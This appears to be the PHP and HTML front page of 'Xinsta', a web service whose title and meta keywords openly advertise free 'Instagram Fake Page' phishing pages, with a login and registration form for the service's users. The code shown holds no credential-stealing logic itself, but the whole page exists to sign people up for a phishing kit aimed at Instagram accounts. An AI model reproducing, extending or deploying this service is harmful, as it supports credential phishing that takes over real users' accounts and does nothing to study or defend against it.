<?php
session_start();
if ($_SESSION['login'] == "true") {
  header("Location: dashboard.php");
  die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta name="generator" content="PHP Script">
	<meta name="keywords" content="xinsta,x-insta,x insta,phishing,pages,hack,anonymous,free,best,Professional,mr.wixxsid, fake,pages,instagram">
	<meta name="description" content="Welcome to Xinsta the Best Free Professional website to get a Secured Instagram Fake Page." />
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="language" content="en" />
	<meta name="copyright" content="xinsta">
	<meta name="robots" content="index, follow">
	<meta name="viewport" content="width=device-width, intiale-scale=1.0">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">
	<link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="assets/css/normalize.css">
	<link rel="stylesheet" type="text/css" href="assets/css/styleIndex.css">
	<link rel="icon" href="assets/img/icon.png">
	<link rel="stylesheet" type="text/css" href="assets/css/scrollbar.css">
	<title>Xinsta</title>
</head>
<body>
	<nav>
		<img src="assets/img/icon.png" alt="" id="navbar_img">
	</nav>
<div id="container">
	<div id="left_content">
		<h2 id="left_content_title">Welcome to Xinsta the Best Free Professional website to get a Secured Instagram Fake Page.</h2>
		<p id="left_content_createdBy">Created by<span id="blue_with_hover"> Mr.wixXsid</span>.</p>
		<p id="left_content_features">Create your <span id="blue_with_hover">account</span> to get <span id="blue_with_hover">Acces</span> to your page.</p>
		<p id="left_content_register">Not a member? <span registerNow id="blue_with_hover">Register</span></p>
		<p id="left_content_login" style="display: none;">Already a member? <span loginNow id="blue_with_hover">Login now!</span></p>
	</div>

	<div id="right_content" login>
		<div id="form_container">
			<h2 id="logIn_title">Log in</h2>
			<input type="email" name="email" id="login_email" placeholder="Email" required>
			<input type="password" name="pass" id="login_pass" placeholder="Password" required>
			<button name="login" id="login">Log in</button>
			<div id="errorLogin" style="max-width: 360px;margin: 10px auto;display: none;">
				<i class="fas fa-times-circle" style="font-size: 14px;color: #ef494d;"></i>
				<span style="font-size: 14px;color: #616161;">The email or password is incorrect</span>
			</div>
		</div>
	</div>

	<div id="right_content" class="register" register style="margin-top: 115px;display: none;">
		<div id="form_container">
			<h2 id="logIn_title">Register</h2>
			<input type="text" name="fn" id="fn" placeholder="Full Name" required>
			<input type="text" name="username" id="usr" placeholder="Username" required>
			<input type="email" name="email" id="email" placeholder="Email" required>
			<input type="password" name="pass" id="pass" placeholder="Password" required>
			<button name="register" id="register">Register</button>
			<div id="successCreated" style="max-width: 360px;margin: 10px auto;display: none;">
				<i class="fas fa-check-circle" style="font-size: 14px;color: #4dc755;"></i>
				<span style="font-size: 14px;color: #616161;">Account successfully created</span>
			</div>
		</div>
	</div>

</div>
<div id="clear"></div>

<footer id="footer">Xinsta All rights reserved.</footer>

<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript" src="assets/js/index.js"></script>
</body>
</html>
